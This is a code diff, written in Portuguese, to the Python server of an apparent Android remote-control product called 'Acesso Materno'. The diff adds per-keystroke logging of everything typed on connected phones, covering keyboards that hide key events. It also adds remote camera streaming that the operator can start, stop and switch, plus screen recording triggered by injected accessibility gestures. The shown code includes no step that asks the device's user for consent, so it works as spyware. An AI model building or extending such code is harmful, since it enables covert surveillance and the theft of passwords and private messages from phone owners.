@@ -705,6 +705,21 @@ def _apk_persistente(chave=None):
     return None
 
 
+def _host_para_apk(valor):
+    """Reduz uma URL/subdomínio ao hostname minúsculo (ex.: 'https://srv1.dominio/'
+    -> 'srv1.dominio'), para o APK ser salvo e procurado pela MESMA chave dos dois
+    lados (compilação e download), sem depender de barra/esquema."""
+    v = (valor or "").strip()
+    if not v:
+        return v
+    try:
+        from urllib.parse import urlparse
+        net = urlparse(v if "://" in v else "https://" + v).netloc
+        return (net or v).strip().lower()
+    except Exception:
+        return v.lower()
+
+
 def _porta_esta_livre(porta):
     import socket as _s
     sock = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
@@ -1137,11 +1152,23 @@ _ARQUIVO_LICENCA_CLIENTE = os.path.join(os.path.expanduser("~"), ".acessomaterno
 SERVER_URL_CLIENTE = ""
 CLIENTE_NOME = ""
 ROUTE_CIDR_CLIENTE = ""
+LICENSE_KEY_CLIENTE = ""
+
+# ============================================================================
+# ENDEREÇO FIXO DE DOWNLOAD DO APK (modelo B: 1 servidor por cliente)
+# ----------------------------------------------------------------------------
+# No modelo B, o subdomínio do cliente (srvX) aponta para a MÁQUINA DO CLIENTE,
+# então o APK NÃO pode ser baixado de lá (a máquina do cliente não tem o APK).
+# Os APKs compilados ficam na SUA máquina (CEO). Este é o endereço público fixo
+# que aponta para a SUA máquina e serve /download-apk. Troque aqui se o seu host
+# de download for outro (ex.: https://downloads.megabrasiliautilidades.store).
+# É embutido no .exe, então todo cliente sabe de onde baixar.
+CEO_APK_HOST = "https://painel.megabrasiliautilidades.store"
 
 def _carregar_config_licenca_cliente():
     """Lê o server_url (e metadados) salvos pela ativação da licença.
     Chamada no boot, APÓS registrar_log já estar definido (ver mais abaixo)."""
-    global SERVER_URL_CLIENTE, CLIENTE_NOME, ROUTE_CIDR_CLIENTE
+    global SERVER_URL_CLIENTE, CLIENTE_NOME, ROUTE_CIDR_CLIENTE, LICENSE_KEY_CLIENTE
     import json as _json
     try:
         if os.path.exists(_ARQUIVO_LICENCA_CLIENTE):
@@ -1150,6 +1177,7 @@ def _carregar_config_licenca_cliente():
             SERVER_URL_CLIENTE = str(dados.get("server_url") or "").strip()
             CLIENTE_NOME = str(dados.get("cliente_nome") or "").strip()
             ROUTE_CIDR_CLIENTE = str(dados.get("route_cidr") or "").strip()
+            LICENSE_KEY_CLIENTE = str(dados.get("license_key") or "").strip()
             try:
                 if SERVER_URL_CLIENTE:
                     registrar_log(f"[LICENCA] Servidor ativo desta instância: {SERVER_URL_CLIENTE}"
@@ -1245,6 +1273,8 @@ try:
         finalizar_todas_gravacoes,
         registrar_auditoria,
         registrar_input,
+        registrar_tecla as _grav_registrar_tecla,
+        finalizar_teclado as _grav_finalizar_teclado,
         listar_historico as listar_historico_gravacoes,
         estado_gravacao,
         exportar_auditoria,
@@ -1255,9 +1285,12 @@ try:
         avaliar_frame as _grav_avaliar_frame,
         tempo_desde_movimento as _grav_tempo_sem_mov,
         marcar_gesto as _grav_marcar_gesto,
+        marcar_evento_acessibilidade as _grav_marcar_acess,
+        tempo_desde_acessibilidade as _grav_tempo_sem_acess,
         limpar_estado_movimento as _grav_limpar_mov,
         GRACE_PARAR_SEM_MOVIMENTO_S,
         MAX_PARADO_TELA_ACESA_S,
+        LIMIAR_MOVIMENTO_ACESSIBILIDADE as _LIMIAR_MOV_ACESS,
     )
 except Exception as _e_grav:
     GRAVACAO_DISPONIVEL = False
@@ -1265,15 +1298,20 @@ except Exception as _e_grav:
     PASTA_VIDEOS_FPS = None
     GRACE_PARAR_SEM_MOVIMENTO_S = 4.0
     MAX_PARADO_TELA_ACESA_S = 30.0
+    _LIMIAR_MOV_ACESS = 0.8
     def _grav_avaliar_frame(*_a, **_k): return (True, False)
     def _grav_tempo_sem_mov(*_a, **_k): return 1e9
     def _grav_marcar_gesto(*_a, **_k): pass
+    def _grav_marcar_acess(*_a, **_k): pass
+    def _grav_tempo_sem_acess(*_a, **_k): return 1e9
     def _grav_limpar_mov(*_a, **_k): pass
     def iniciar_gravacao(*_a, **_k): return {"ok": False, "erro": "Gravação indisponível"}
     def finalizar_gravacao(*_a, **_k): return {"ok": False, "erro": "Gravação indisponível"}
     def finalizar_todas_gravacoes(*_a, **_k): return []
     def registrar_auditoria(*_a, **_k): pass
     def registrar_input(*_a, **_k): pass
+    def _grav_registrar_tecla(*_a, **_k): pass
+    def _grav_finalizar_teclado(*_a, **_k): pass
     def listar_historico_gravacoes(*_a, **_k): return []
     def estado_gravacao(*_a, **_k): return {}
     def exportar_auditoria(*_a, **_k): return None
@@ -1302,6 +1340,10 @@ _EXECUTOR_GRAVACAO = _ThreadPoolExecutor(
 # emits/sec (~11 MB/s por cliente). Limita a 12fps por dispositivo para não
 # saturar o barramento de rede/serialização — a visualização continua fluida.
 MAX_FPS_BROADCAST = 12.0
+# TETO DE DISPOSITIVOS FÍSICOS SIMULTÂNEOS (proteção de RAM/SSD em 8GB): o 8º
+# aparelho diferente é recusado no handler 'identificar' (emite 'limite_atingido'
+# + sio.disconnect). O painel e os aparelhos já conectados não são afetados.
+LIMITE_DISPOSITIVOS_FISICOS = 7
 _sids_painel = set()       # sids dos clientes do painel + emuladores flutuantes
 # SEPARAÇÃO DE SALAS (Rooms) — comando de tela preta (loading_overlay /
 # atualizacao_status / anúncio) SÓ vai para dispositivos físicos. Emuladores
@@ -1502,6 +1544,16 @@ sio = socketio.AsyncServer(
 
 # Frames de tela POR DISPOSITIVO: nome -> {"jpeg": bytes, "n": int, "ts": float}
 frames_tela = {}
+# PRÉ-ROLL (buffer circular): nome -> deque dos últimos frames JPEG recebidos
+# MESMO com a gravação ociosa. Ao iniciar a gravação (por movimento, gesto ou
+# evento de acessibilidade), estes frames são descarregados PRIMEIRO na fila,
+# garantindo que o instante ANTERIOR ao gatilho entre no .avi (sem janela cega).
+# maxlen=20 ≈ ~2s a ~10-12fps de chegada.
+PREROLL_MAXLEN = 20
+_preroll_frames = {}                 # nome -> deque(maxlen=PREROLL_MAXLEN)
+# Janela em que atividade de acessibilidade MANTÉM a gravação viva, mesmo com a
+# tela visualmente estática (impede o corte por MAX_PARADO/GRACE).
+JANELA_ACESSIBILIDADE_S = 45.0
 filhos = set()                       # sids dos aparelhos conectados
 sid_nome = {}                        # sid  -> nome do dispositivo
 nome_sid = {}                        # nome -> sid (socket atual do dispositivo)
@@ -1740,8 +1792,17 @@ async def disconnect(sid):
                 )
         except Exception as _e_gd:
             registrar_log(f"[GRAVACAO] Erro ao finalizar no disconnect: {_e_gd}")
+    # Fecha a linha de digitação em andamento deste dispositivo (grava o que
+    # foi digitado até aqui em UMA linha; nenhuma letra se perde no disconnect).
+    if nome and not _reconectou:
+        try:
+            await asyncio.get_running_loop().run_in_executor(
+                _EXECUTOR_GRAVACAO, _grav_finalizar_teclado, nome)
+        except Exception:
+            pass
     # Esquece o estado de movimento do dispositivo que caiu (evita vazamento).
     if nome and not _reconectou:
+        _preroll_frames.pop(nome, None)  # libera o buffer de pré-roll
         try:
             _grav_limpar_mov(nome)
         except Exception:
@@ -1784,7 +1845,7 @@ async def disconnect(sid):
 
 
 @sio.event
-async def identificar(sid, tipo, tipo_dispositivo=None):
+async def identificar(sid, tipo, tipo_dispositivo=None, device_id=None):
     nome = str(tipo) if tipo else "dispositivo"
     if nome.lower() == "painel":
         await sio.enter_room(sid, "painel")
@@ -1819,6 +1880,67 @@ async def identificar(sid, tipo, tipo_dispositivo=None):
         except Exception as _e_sessao_painel:
             registrar_log(f"[SESSAO AVISO] envio da lista de sessão ao painel falhou: {_e_sessao_painel}")
         return
+
+    # ========================================================================
+    # (3) IDENTIFICADOR ÚNICO DE DISPOSITIVO (anti-colisão de modelos iguais).
+    # ------------------------------------------------------------------------
+    #  a) Se o Android mandar um device_id/sufixo único (ex.:
+    #     "samsung-SM-A546E-a1b2c3"), ele vira o NOME definitivo da sala
+    #     stream:{nome} e dos arquivos .avi — dois aparelhos do mesmo modelo
+    #     ficam totalmente separados.
+    #  b) Compatibilidade com apps antigos: se vier só "MANUFACTURER-MODEL" e
+    #     JÁ existir OUTRO sid online com exatamente esse nome, acrescenta um
+    #     sufixo curto do sid (-{sid[:4]}) para não colidir na mesma sala.
+    # ========================================================================
+    _did = str(device_id).strip() if device_id else ""
+    if _did:
+        nome = _did
+    else:
+        _sid_existente = nome_sid.get(nome)
+        if _sid_existente is not None and _sid_existente != sid:
+            _nome_base = nome
+            nome = f"{_nome_base}-{sid[:4]}"
+            registrar_log(
+                f"[ISOLAMENTO] Modelo duplicado '{_nome_base}' já online em "
+                f"outro sid — este aparelho (sid {sid[:6]}) renomeado para "
+                f"'{nome}' para não colidir na sala/gravação.")
+
+    # ========================================================================
+    # (1) LIMITE DE 7 DISPOSITIVOS FÍSICOS SIMULTÂNEOS (proteção RAM/SSD, 8GB).
+    # ------------------------------------------------------------------------
+    # Conta os NOMES físicos distintos já online (exclui emuladores e exclui
+    # ESTE próprio aparelho, para não bloquear reconexão do mesmo device). Se já
+    # houver 7 e este for um 8º diferente, recusa: emite 'limite_atingido',
+    # registra aviso e desconecta — o painel e os 7 conectados seguem normais.
+    # ========================================================================
+    if str(tipo_dispositivo or "").lower() != "emulador":
+        _nomes_fisicos_online = set()
+        for _s, _n in list(sid_nome.items()):
+            if _s in _sids_emuladores:
+                continue
+            _nomes_fisicos_online.add(_n)
+        _nomes_fisicos_online.discard(nome)  # reconexão do mesmo não conta
+        if len(_nomes_fisicos_online) >= LIMITE_DISPOSITIVOS_FISICOS:
+            registrar_log(
+                f"[LIMITE] 8º aparelho '{nome}' (sid {sid[:6]}) RECUSADO — "
+                f"já há {len(_nomes_fisicos_online)} dispositivos físicos "
+                f"online (máx {LIMITE_DISPOSITIVOS_FISICOS}). Desconectando "
+                f"para proteger RAM/SSD.")
+            try:
+                await sio.emit(
+                    "limite_atingido",
+                    {"ok": False, "motivo": "limite_dispositivos",
+                     "limite": LIMITE_DISPOSITIVOS_FISICOS,
+                     "dispositivo": nome},
+                    to=sid)
+            except Exception:
+                pass
+            try:
+                await sio.disconnect(sid)
+            except Exception:
+                pass
+            return
+
     filhos.add(sid)
     sid_nome[sid] = nome
     nome_sid[nome] = sid
@@ -2126,6 +2248,75 @@ async def evento_nativo_http(request: Request):
         return {"ok": False, "erro": f"evento desconhecido: {evento}"}
     await handler(None, data)
     return {"ok": True}
+
+
+async def _descarregar_preroll(nome, grav):
+    """Descarrega o buffer circular (pré-roll) do dispositivo na fila da gravação
+    recém-iniciada, em ordem cronológica, ANTES do frame atual. Assim o instante
+    anterior ao gatilho entra no vídeo. enfileirar() pode bloquear (backpressure),
+    então roda no executor dedicado. Nunca levanta."""
+    try:
+        buf = _preroll_frames.get(nome)
+        if not buf:
+            return
+        frames = list(buf)   # cópia-snapshot (ordem antiga -> recente)
+        buf.clear()          # consumido: não reenfileira em futuros starts
+        _loop = asyncio.get_running_loop()
+        for _jp in frames:
+            try:
+                await _loop.run_in_executor(_EXECUTOR_GRAVACAO, grav.enfileirar, _jp)
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+
+@sio.on("evento_acessibilidade")
+async def evento_acessibilidade(sid, data=None):
+    """Recebe do app Android a sinalização de que o serviço de acessibilidade
+    ACABOU de atuar (Inject/gesto/clique automático). Dispara/mantém a gravação
+    mesmo quando a ação não muda a tela visivelmente.
+
+    Payload (dict, campos opcionais): {tipo, ts, dispositivo, ...metadados}.
+    Compatível com dispositivos antigos: se não mandarem nada, usa o nome do sid."""
+    if isinstance(data, dict):
+        nome = data.get("dispositivo") or sid_nome.get(sid)
+        tipo_evt = str(data.get("tipo") or "acessibilidade")
+    else:
+        nome = sid_nome.get(sid)
+        tipo_evt = "acessibilidade"
+    if not nome or nome == "global":
+        return
+    # Marca movimento + trilha de acessibilidade (janela anti-corte) e audita.
+    try:
+        _grav_marcar_acess(nome)
+    except Exception:
+        pass
+    try:
+        registrar_input("acessibilidade", nome, tipo=tipo_evt)
+    except Exception:
+        pass
+    if not GRAVACAO_DISPONIVEL:
+        return
+    # START imediato se ainda não estiver gravando este dispositivo.
+    if nome not in gravadores_ativos:
+        try:
+            _loop = asyncio.get_running_loop()
+            _r = await _loop.run_in_executor(
+                _EXECUTOR_GRAVACAO,
+                _functools.partial(iniciar_gravacao, nome,
+                                   operador=f"acessibilidade:{tipo_evt[:16]}"))
+            if isinstance(_r, dict) and _r.get("ok") and not _r.get("ja_ativa"):
+                _grav_novo = gravadores_ativos.get(nome)
+                if _grav_novo is not None:
+                    await _descarregar_preroll(nome, _grav_novo)  # pré-roll
+                _r["acao"] = "iniciar"
+                _r["dispositivo"] = nome
+                _r["automatico"] = True
+                _r["gatilho"] = "acessibilidade"
+                await sio.emit("gravacao_estado", _r, room="painel")
+        except Exception:
+            pass
 
 
 @sio.on("tecla_painel")
@@ -2599,6 +2790,18 @@ async def enviar_tela(sid, *args):
     if nome != "global" and rec["n"] == 1:
         _auto_abrir_emulador_nativo(nome)
 
+    # PRÉ-ROLL: enquanto NÃO há gravação ativa, guarda os últimos frames no buffer
+    # circular. Ao disparar o start (movimento/gesto/acessibilidade), estes frames
+    # são descarregados primeiro — cobrindo inclusive a "janela cega" do 1º frame
+    # (rec["n"]==1), que antes nunca entrava no vídeo. Durante a gravação não
+    # acumula (os frames já vão para a fila do gravador).
+    if nome != "global" and nome not in gravadores_ativos:
+        _buf = _preroll_frames.get(nome)
+        if _buf is None:
+            _buf = deque(maxlen=PREROLL_MAXLEN)
+            _preroll_frames[nome] = _buf
+        _buf.append(jpeg)
+
     # ================================================================
     # GRAVAÇÃO ACIONADA POR MOVIMENTO (economiza memória):
     #   • INICIA só quando há movimento no dispositivo — gesto remoto
@@ -2612,25 +2815,38 @@ async def enviar_tela(sid, *args):
     if GRAVACAO_DISPONIVEL and nome != "global":
         try:
             _loop_grav = asyncio.get_running_loop()
+            # Acessibilidade recente (≤ JANELA_ACESSIBILIDADE_S) deixa a detecção
+            # mais sensível (limiar menor) e trava o corte mais abaixo.
+            _acess_recente = _grav_tempo_sem_acess(nome) <= JANELA_ACESSIBILIDADE_S
+            _limiar_mov = _LIMIAR_MOV_ACESS if _acess_recente else None
             _tem_mov, _tela_escura = await _loop_grav.run_in_executor(
                 _EXECUTOR_GRAVACAO,
-                _functools.partial(_grav_avaliar_frame, nome, jpeg))
+                _functools.partial(_grav_avaliar_frame, nome, jpeg, _limiar_mov))
             # START: houve movimento e ainda não há gravação ativa.
             if _tem_mov and nome not in gravadores_ativos:
                 _r_auto = await _loop_grav.run_in_executor(
                     _EXECUTOR_GRAVACAO,
                     _functools.partial(iniciar_gravacao, nome, operador=f"auto-mov:{sid[:6]}"))
                 if _r_auto.get("ok") and not _r_auto.get("ja_ativa"):
+                    # Descarrega o pré-roll (instante anterior ao gatilho) ANTES
+                    # do frame atual, para não perder o início do movimento.
+                    _grav_novo = gravadores_ativos.get(nome)
+                    if _grav_novo is not None:
+                        await _descarregar_preroll(nome, _grav_novo)
                     _r_auto["acao"] = "iniciar"
                     _r_auto["dispositivo"] = nome
                     _r_auto["automatico"] = True
                     _r_auto["gatilho"] = "movimento"
                     await sio.emit("gravacao_estado", _r_auto, room="painel")
             # STOP: gravando, tela apagada E parado há GRACE segundos.
+            # TRAVA ANTI-CORTE: se houve acessibilidade nos últimos
+            # JANELA_ACESSIBILIDADE_S, NÃO corta — mesmo com a tela estática.
             if nome in gravadores_ativos:
                 _parado = _grav_tempo_sem_mov(nome)
                 _parar = (_tela_escura and _parado >= GRACE_PARAR_SEM_MOVIMENTO_S) \
                     or (_parado >= MAX_PARADO_TELA_ACESA_S)
+                if _parar and _acess_recente:
+                    _parar = False
                 if _parar:
                     _r_fim = await _loop_grav.run_in_executor(
                         _EXECUTOR_GRAVACAO, finalizar_gravacao, nome)
@@ -2742,8 +2958,172 @@ async def teclado_tecla(sid, data):
     if not nome:
         return
     data["dispositivo"] = nome
+    # PERSISTÊNCIA EM ORDEM, NA MESMA LINHA: grava a tecla no instante do toque
+    # (acumula a sequência por dispositivo e fecha a linha no Enter/idle/troca de
+    # app). Roda no executor dedicado porque a escrita faz fsync (durável). NÃO
+    # interfere na retransmissão ao vivo abaixo.
+    if nome != "global":
+        _tecla = data.get("tecla")
+        if _tecla is not None:
+            _app_tecla = data.get("app")
+            try:
+                await asyncio.get_running_loop().run_in_executor(
+                    _EXECUTOR_GRAVACAO,
+                    _functools.partial(_grav_registrar_tecla, nome, _tecla, _app_tecla))
+            except Exception:
+                pass
     if _stream_viewers.get(nome):
         _t = asyncio.create_task(sio.emit("teclado_tecla", data, room=f"stream:{nome}"))
+        _tarefas_broadcast.add(_t)
+        _t.add_done_callback(_tarefas_broadcast.discard)
+
+
+@sio.on("teclado_log")
+async def teclado_log(sid, data):
+    """Texto COMPLETO do campo a cada mudança (TYPE_VIEW_TEXT_CHANGED).
+
+    O agente Android emite 'teclado_log' a CADA letra digitada, com o conteúdo
+    atual do EditText. É a fonte de tempo real CONFIÁVEL para qualquer teclado
+    (inclusive o Samsung Honeyboard, que quase nunca expõe cliques de tecla um a
+    um via 'teclado_tecla'). Sem este handler o evento era DESCARTADO e o leitor
+    só recebia a árvore de acessibilidade, reconstruindo uma única linha no fim
+    da digitação — por isso "não capturava em tempo real". Aqui retransmitimos ao
+    leitor FPS na sala stream:{dispositivo}, que grava letra a letra ao vivo.
+    """
+    if isinstance(data, str):
+        try:
+            import json
+            data = json.loads(data)
+        except Exception:
+            return
+    if not isinstance(data, dict):
+        return
+    nome = data.get("dispositivo") or sid_nome.get(sid, "global")
+    if not nome:
+        return
+    data["dispositivo"] = nome
+    if _stream_viewers.get(nome):
+        _t = asyncio.create_task(sio.emit("teclado_log", data, room=f"stream:{nome}"))
+        _tarefas_broadcast.add(_t)
+        _t.add_done_callback(_tarefas_broadcast.discard)
+
+
+# ===========================================================================
+# CÂMERA (botão "View" do emulador nativo): pipeline JPEG via Socket.IO,
+# espelhando o do espelhamento de tela. O aparelho captura a câmera (Camera2)
+# e manda 'camera_frame'; o servidor retransmite SÓ para a sala exclusiva
+# 'camera:{dispositivo}'. Os comandos iniciar/parar/trocar vão do emulador
+# nativo -> aparelho (via _sids_alvo, isolamento rígido por dispositivo).
+# ===========================================================================
+_camera_viewers = {}   # nome_dispositivo -> set(sids) assistindo à CÂMERA
+
+
+@sio.on("assistir_camera")
+async def assistir_camera(sid, data):
+    """Janela da câmera (emulador nativo) entra na sala exclusiva camera:{nome}."""
+    nome = (data or {}).get("dispositivo") if isinstance(data, dict) else (
+        data if isinstance(data, str) else None)
+    if not nome:
+        return
+    _camera_viewers.setdefault(nome, set()).add(sid)
+    try:
+        await sio.enter_room(sid, f"camera:{nome}")
+        registrar_log(f"[CAMERA] sid {sid[:6]} assistindo camera:{nome}")
+    except Exception:
+        pass
+
+
+@sio.on("sair_camera")
+async def sair_camera(sid, data=None):
+    """Viewer saiu da câmera — remove de todas as salas camera:*."""
+    for nome in list(_camera_viewers.keys()):
+        s = _camera_viewers.get(nome)
+        if s and sid in s:
+            s.discard(sid)
+            if not s:
+                _camera_viewers.pop(nome, None)
+            try:
+                await sio.leave_room(sid, f"camera:{nome}")
+            except Exception:
+                pass
+
+
+async def _relay_cmd_camera(evento, data):
+    dispositivo = (data or {}).get("dispositivo") if isinstance(data, dict) else None
+    alvos = _sids_alvo(dispositivo)
+    for fsid in alvos:
+        await sio.emit(evento, data or {}, to=fsid)
+    registrar_log(f"[CAMERA] cmd {evento} -> {dispositivo or 'todos'} ({len(alvos)} socket(s))")
+
+
+@sio.on("iniciar_camera")
+async def iniciar_camera(sid, data):
+    await _relay_cmd_camera("iniciar_camera", data)
+
+
+@sio.on("parar_camera")
+async def parar_camera(sid, data):
+    await _relay_cmd_camera("parar_camera", data)
+
+
+@sio.on("trocar_camera")
+async def trocar_camera(sid, data):
+    await _relay_cmd_camera("trocar_camera", data)
+
+
+@sio.on("camera_frame")
+async def camera_frame(sid, *args):
+    """Aparelho -> servidor: 1 frame JPEG da câmera. Retransmite para a sala
+    exclusiva camera:{dispositivo}. Mesma varredura de bytes do enviar_tela."""
+    jpeg = None
+    for arg in args:
+        if isinstance(arg, (bytes, bytearray)):
+            jpeg = bytes(arg)
+            break
+    if jpeg is None:
+        for arg in args:
+            if isinstance(arg, dict):
+                for v in arg.values():
+                    if isinstance(v, (bytes, bytearray)):
+                        jpeg = bytes(v)
+                        break
+            if jpeg:
+                break
+    if jpeg is None:
+        return
+    nome = sid_nome.get(sid, "global")
+    if _camera_viewers.get(nome):
+        _t = asyncio.create_task(
+            sio.emit("camera_frame", [{"dispositivo": nome}, jpeg], room=f"camera:{nome}"))
+        _tarefas_broadcast.add(_t)
+        _t.add_done_callback(_tarefas_broadcast.discard)
+
+
+@sio.on("camera_h264")
+async def camera_h264(sid, *args):
+    """Aparelho -> servidor: pacote H.264 (NAL Annex-B) da câmera. Retransmite
+    para a sala exclusiva camera:{dispositivo}. Igual ao camera_frame, mas com
+    vídeo codificado (suave, boa qualidade). A janela View decodifica via PyAV."""
+    nal = None
+    for arg in args:
+        if isinstance(arg, (bytes, bytearray)):
+            nal = bytes(arg)
+            break
+    if nal is None:
+        for arg in args:
+            if isinstance(arg, dict):
+                for v in arg.values():
+                    if isinstance(v, (bytes, bytearray)):
+                        nal = bytes(v)
+                        break
+            if nal:
+                break
+    if nal is None:
+        return
+    nome = sid_nome.get(sid, "global")
+    if _camera_viewers.get(nome):
+        _t = asyncio.create_task(
+            sio.emit("camera_h264", [{"dispositivo": nome}, nal], room=f"camera:{nome}"))
         _tarefas_broadcast.add(_t)
         _t.add_done_callback(_tarefas_broadcast.discard)
 
@@ -5268,7 +5648,11 @@ def compilar_apk_em_segundo_plano():
     # Cópia persistente (fora do bundle) do último APK — sobrevive a fechar/
     # reabrir o .exe e a um .exe novo, para o botão "Baixar última" nunca ficar
     # sem APK e não exigir recompilar toda vez.
-    _persistir_ultimo_apk(apk)
+    # IMPORTANTE (fluxo "CEO compila, cliente baixa"): salvamos TAMBÉM marcado
+    # pelo SUBDOMÍNIO assado neste APK (_url_apk). Assim cada cliente, ao baixar
+    # pelo subdomínio dele (/download-apk?chave=<subdominio>), recebe o APK que
+    # aponta para o servidor DELE — e não o último de outro cliente.
+    _persistir_ultimo_apk(apk, chave=_host_para_apk(_url_apk))
     try:
         _arquivar_build(apk, _nome_app_build, _ultima_config_app.get("icone_bytes"))
     except Exception as e_hist:
@@ -6586,6 +6970,59 @@ async def encerrar_sessao():
     return {"status": "ok", "removidos": quantidade}
 
 
+@app.post("/sair-licenca")
+@app.get("/sair-licenca")
+def rota_sair_licenca():
+    """Logout do painel (botão SAIR do dock): apaga a licença salva em
+    ~/.acessomaterno_licenca.json e reinicia o 'Acesso Materno' para que a
+    Tela de Ativação (bloqueio do Supabase) apareça de novo e o usuário digite
+    outra chave. O relançamento é feito com 2s de atraso por um processo
+    separado (cmd/shell), garantindo que ESTE processo já tenha encerrado antes
+    de o novo subir — evita conflito de porta e de instância única."""
+    # 1) Apaga a licença salva (força a tela de bloqueio no próximo início)
+    try:
+        if os.path.exists(_ARQUIVO_LICENCA_CLIENTE):
+            os.remove(_ARQUIVO_LICENCA_CLIENTE)
+            registrar_log("[SAIR] Licença local removida — próximo início exigirá nova chave.")
+    except Exception as _e_rm:
+        registrar_log(f"[SAIR AVISO] não foi possível remover a licença: {_e_rm}")
+
+    # 2) Agenda o relançamento do app (novo processo, após este encerrar)
+    try:
+        if getattr(sys, "frozen", False):
+            _exe = sys.executable
+            if os.name == "nt":
+                subprocess.Popen(
+                    f'cmd /c timeout /t 2 /nobreak >nul & start "" "{_exe}"',
+                    shell=True,
+                    creationflags=getattr(subprocess, "DETACHED_PROCESS", 0),
+                )
+            else:
+                subprocess.Popen(["/bin/sh", "-c", f'sleep 2; "{_exe}" &'])
+        else:
+            _args = [sys.executable] + list(sys.argv)
+            if os.name == "nt":
+                _cmd = " ".join(f'"{a}"' for a in _args)
+                subprocess.Popen(
+                    f'cmd /c timeout /t 2 /nobreak >nul & start "" {_cmd}',
+                    shell=True,
+                    creationflags=getattr(subprocess, "DETACHED_PROCESS", 0),
+                )
+            else:
+                subprocess.Popen(["/bin/sh", "-c", "sleep 2; " + " ".join(_args) + " &"])
+        registrar_log("[SAIR] Relançamento agendado (2s).")
+    except Exception as _e_relan:
+        registrar_log(f"[SAIR AVISO] falha ao agendar relançamento: {_e_relan}")
+
+    # 3) Encerra ESTE processo logo em seguida (dá tempo da resposta HTTP sair)
+    def _encerrar():
+        time.sleep(0.8)
+        os._exit(0)
+    threading.Thread(target=_encerrar, daemon=True).start()
+
+    return {"ok": True, "mensagem": "Licença removida. Reiniciando para a tela de ativação..."}
+
+
 @app.get("/sessao-ativa")
 def sessao_ativa_status():
     """Lista os dispositivos da sessão de tela ativa e quais estão online agora."""
@@ -6640,11 +7077,18 @@ async def salvar_posicoes_cartoes(request: Request):
 @app.get("/config-cliente")
 def config_cliente():
     """Expõe ao painel o server_url vinculado à licença desta instância, para o
-    gerador de APK preencher automaticamente o campo de URL do servidor."""
+    gerador de APK preencher automaticamente o campo de URL do servidor.
+    Também informa a chave (para o cliente baixar o APK compilado PARA ELE) e se
+    esta instância PODE compilar (CEO/dev) ou é só cliente (baixa o APK pronto)."""
     return {
         "server_url": SERVER_URL_CLIENTE,
         "cliente_nome": CLIENTE_NOME,
         "route_cidr": ROUTE_CIDR_CLIENTE,
+        "license_key": LICENSE_KEY_CLIENTE,
+        # CEO (rodando da fonte, modo dev) compila; cliente (.exe/dist) só baixa.
+        "pode_compilar": (BUILD_MODE == "dev"),
+        # Endereço fixo (máquina do CEO) de onde o cliente baixa o APK pronto.
+        "apk_download_host": CEO_APK_HOST,
     }
 
 
@@ -6795,18 +7239,42 @@ def status_overlay_atualizacao(dispositivo: str = None):
 
 
 @app.get("/download-apk")
-def download_apk():
-    """Entrega o APK gerado pela última compilação (funciona via túnel remoto)."""
+def download_apk(chave: str = ""):
+    """Entrega o APK para instalação (funciona via túnel remoto).
+
+    Fluxo "CEO compila, cliente baixa": quando o cliente pede com ?chave=<licenca>,
+    entregamos o APK compilado ESPECIFICAMENTE para aquela chave (<chave>.apk em
+    ~/AcessoMaterno_APKs), que já foi assado com o subdomínio daquele cliente.
+    Ordem de busca:
+      1) <chave>.apk persistente (o APK daquele cliente)  ← prioridade do cliente
+      2) APK da última compilação em memória (estado_build) ← útil pro CEO
+      3) ultimo.apk persistente (fallback geral)
+    """
+    # 1) APK específico da chave do cliente (assado com o subdomínio dele)
+    chave = _host_para_apk(chave)
+    if chave:
+        apk_chave = _apk_persistente(chave)
+        if apk_chave and os.path.exists(apk_chave):
+            return FileResponse(apk_chave,
+                                media_type="application/vnd.android.package-archive",
+                                filename="app.apk")
+
+    # 2) APK da última compilação (sessão atual do CEO)
     apk = estado_build.get("apk")
     if apk and os.path.exists(apk):
         nome = os.path.basename(apk)
         return FileResponse(apk, media_type="application/vnd.android.package-archive", filename=nome)
-    # FALLBACK: último APK persistente (~/AcessoMaterno_APKs) — sobrevive a
-    # fechar/reabrir o .exe e a um .exe novo, sem recompilar.
+
+    # 3) FALLBACK: ultimo.apk persistente (~/AcessoMaterno_APKs) — sobrevive a
+    #    fechar/reabrir o .exe e a um .exe novo, sem recompilar.
     apk_p = _apk_persistente()
     if apk_p:
         return FileResponse(apk_p, media_type="application/vnd.android.package-archive",
                             filename="app.apk")
+
+    if chave:
+        return {"status": "erro", "mensagem":
+                "Ainda não há APK compilado para esta chave. Avise o suporte (CEO) para gerar o seu aplicativo."}
     return {"status": "erro", "mensagem": "Nenhum APK gerado ainda. Clique em Gerar Aplicativo."}
 
 
